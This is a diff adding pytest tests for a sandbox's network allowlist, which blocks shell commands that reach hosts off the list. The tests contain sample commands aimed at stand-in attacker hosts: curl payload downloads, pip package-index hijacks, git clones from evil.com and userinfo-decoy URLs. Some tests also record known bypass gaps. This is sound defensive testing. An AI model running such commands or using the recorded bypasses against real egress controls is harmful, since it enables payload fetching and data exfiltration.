@@ -629,3 +629,181 @@ class TestSeccompInstallerFailClosed:
         r = sb.run("echo ok", shell=True)
         assert r.returncode == 126
         assert "fail-closed" in r.stderr
+
+
+class TestRestrictedAllowlist:
+    """Wave 3: network=allowlist -- soft per-host egress tier."""
+
+    def _sb(self, allowlist=None, **kw):
+        return RestrictedProcessBackend(workdir=".", network="allowlist", network_allowlist=allowlist or [], **kw)
+
+    def test_allowed_host_passes(self):
+        sb = self._sb(["pypi.org", "github.com"])
+        assert sb.network_allowed("curl https://pypi.org/simple/requests/") is True
+
+    def test_disallowed_host_blocked_126(self):
+        sb = self._sb(["pypi.org"])
+        res = sb.run("curl https://evil.example/payload", shell=True)
+        assert res.returncode == 126
+        assert "evil.example" in res.stderr
+        assert "network allowlist" in res.stderr
+
+    def test_pip_explicit_index_blocked(self):
+        sb = self._sb(["pypi.org"])
+        res = sb.run("pip install --index-url https://evil.example/simple x", shell=True)
+        assert res.returncode == 126
+
+    def test_pip_default_index_passes(self):
+        # No host WRITTEN in the command -> passes (soft tier constrains
+        # explicit destinations only; documented boundary).
+        sb = self._sb(["pypi.org"])
+        assert sb.network_allowed("pip install requests") is True
+
+    def test_git_ssh_form_scanned(self):
+        sb = self._sb(["github.com"])
+        assert sb.network_allowed("git clone git@github.com:org/repo.git") is True
+        res = sb.run("git clone git@evil.example:org/repo.git", shell=True)
+        assert res.returncode == 126
+
+    def test_glob_patterns(self):
+        sb = self._sb(["*.githubusercontent.com", "github.com"])
+        assert sb.network_allowed("curl https://raw.githubusercontent.com/x/y") is True
+        assert sb.network_allowed("curl https://codeload.evil.com/z") is False
+
+    def test_userinfo_decoy_uses_real_host(self):
+        # P0 regression: in ``https://github.com@evil.com`` github.com is the
+        # USERINFO and evil.com is the real host git contacts. The allowlist must
+        # not be fooled by the allowlisted userinfo decoy.
+        sb = self._sb(["github.com"])
+        assert sb.network_allowed("git clone https://github.com@evil.com/x") is False
+        assert sb._allowlist_violation("git clone https://github.com@evil.com/x") == (
+            "blocked: host 'evil.com' (via 'git') is not in the sandbox network allowlist"
+        )
+
+    def test_userinfo_with_password_uses_real_host(self):
+        # user:pass@evil.com -> real host evil.com. Allowlisting the username
+        # ``user`` must NOT approve a connection to evil.com.
+        sb = self._sb(["evil.com"])
+        assert sb.network_allowed("curl https://user:pass@evil.com/x") is True
+        sb2 = self._sb(["user"])
+        assert sb2.network_allowed("curl https://user:pass@evil.com/x") is False
+
+    def test_userinfo_pip_index_hijack(self):
+        sb = self._sb(["pypi.org"])
+        assert sb.network_allowed("pip install --index-url https://pypi.org@evil.com/simple x") is False
+
+    def test_port_stripped_before_match(self):
+        sb = self._sb(["github.com"])
+        assert sb.network_allowed("curl https://github.com:443/x") is True
+
+    def test_userinfo_with_glob_allowlist(self):
+        sb = self._sb(["*.githubusercontent.com"])
+        # api@raw.githubusercontent.com -> real host matches the glob.
+        assert sb.network_allowed("curl https://api@raw.githubusercontent.com/x") is True
+
+    def test_multiple_at_signs_last_wins(self):
+        sb = self._sb(["evil.com"])
+        assert sb.network_allowed("curl https://a@b@evil.com/x") is True
+
+    def test_case_insensitive_host_match(self):
+        # DNS hosts are case-insensitive -- allowlist and command may differ.
+        assert self._sb(["GITHUB.COM"]).network_allowed("git clone https://github.com/x") is True
+        assert self._sb(["github.com"]).network_allowed("git clone https://GITHUB.COM/x") is True
+
+    def test_ssh_bare_host_blocked(self):
+        # P1: plain ``ssh user@host`` (no ``:path``) must not be invisible to
+        # the allowlist (migrating deny->allowlist must not silently unlock ssh).
+        sb = self._sb(["github.com"])
+        assert sb.network_allowed("ssh git@evil.com") is False
+        assert sb.network_allowed("ssh -p 2222 git@evil.com") is False
+
+    def test_non_network_command_unaffected(self):
+        sb = self._sb(["pypi.org"])
+        assert sb.network_allowed("python3 -m unittest discover") is True
+        assert sb.network_allowed("ls -la") is True
+
+    def test_deny_mode_ignores_allowlist(self):
+        sb = RestrictedProcessBackend(workdir=".", network="deny", network_allowlist=["pypi.org"])
+        # deny still blanket-blocks curl regardless of the allowlist...
+        assert sb.network_allowed("curl https://pypi.org") is False
+        # ...and still does NOT scan pip (pre-existing deny posture).
+        assert sb.network_allowed("pip install x") is True
+
+    def test_proxy_env_stripped_under_allowlist(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        sb = self._sb(["pypi.org"])
+        env = sb.build_env()
+        assert "HTTPS_PROXY" not in env
+
+    def test_config_flow_yaml_to_backend(self):
+        from koboi.config import Config
+        from koboi.sandbox import build_sandbox
+
+        cfg = Config.from_dict(
+            {
+                "agent": {"name": "t"},
+                "llm": {"model": "m"},
+                "sandbox": {
+                    "backend": "restricted",
+                    "network": "allowlist",
+                    "network_allowlist": ["pypi.org", "*.npmjs.org"],
+                },
+            },
+            validate=True,
+        )
+        sb = build_sandbox(cfg.get("sandbox"))
+        assert sb.name == "restricted"
+        assert sb._network == "allowlist"
+        assert sb._network_allowlist == ["pypi.org", "*.npmjs.org"]
+
+    def test_network_value_typo_rejected(self):
+        from koboi.config import Config
+
+        with pytest.raises(ValueError, match="sandbox.network must be one of"):
+            Config.from_dict(
+                {"agent": {"name": "t"}, "llm": {"model": "m"}, "sandbox": {"network": "alowlist"}},
+                validate=True,
+            )
+
+    def test_multiple_hosts_all_checked(self):
+        # Both --index-url hosts are extracted; one allowlisted, one not ->
+        # blocked. A first-match-wins scanner (only checking the first host)
+        # would miss this exfil hijack.
+        sb = self._sb(["pypi.org"])
+        assert (
+            sb.network_allowed("pip install --index-url https://pypi.org/x --extra-index-url https://evil.com/y")
+            is False
+        )
+
+    def test_empty_allowlist_blocks_every_host(self):
+        # No allowlist -> every host is a violation (fail-closed, not "allow all").
+        sb = self._sb([])
+        assert sb.network_allowed("curl https://anyhost/x") is False
+
+    def test_env_var_host_not_scanned(self):
+        # ``$EVIL`` is not a ``scheme://`` authority and the scanner does not
+        # expand env vars -- documented soft gap (intent-limiting tier). pip is
+        # a scanned binary but writes no literal host token -> passes.
+        sb = self._sb(["pypi.org"])
+        assert sb.network_allowed("pip install --index-url $EVIL/x") is True
+
+    def test_ipv4_host_matches(self):
+        # IPv4 host extracted cleanly (no ``@`` / ``:port`` to strip) and
+        # matches an allowlist entry verbatim.
+        sb = self._sb(["10.0.0.1"])
+        assert sb.network_allowed("curl https://10.0.0.1/x") is True
+
+    def test_compound_command_all_hosts_checked(self):
+        # ``sh`` joiners (``&&``) are not separators -- shlex emits them as
+        # tokens. Every URL/SSH host across BOTH sides of the && must match the
+        # allowlist; here ``evil`` is not allowlisted -> blocked.
+        sb = self._sb(["github.com"])
+        assert sb.network_allowed("git clone https://github.com/x && curl https://evil/y") is False
+
+    def test_ssh_embedded_in_echo_not_gated(self):
+        # ``echo`` is NOT a scanned binary (not in the deny set nor in the
+        # allowlist extra set), so the SSH-form host ``git@evil.com:repo``
+        # inside an echo argument is never extracted. Documented gap -- the
+        # soft tier gates egress tools, not arbitrary echo payloads.
+        sb = self._sb(["github.com"])
+        assert sb.network_allowed("echo git@evil.com:repo") is True
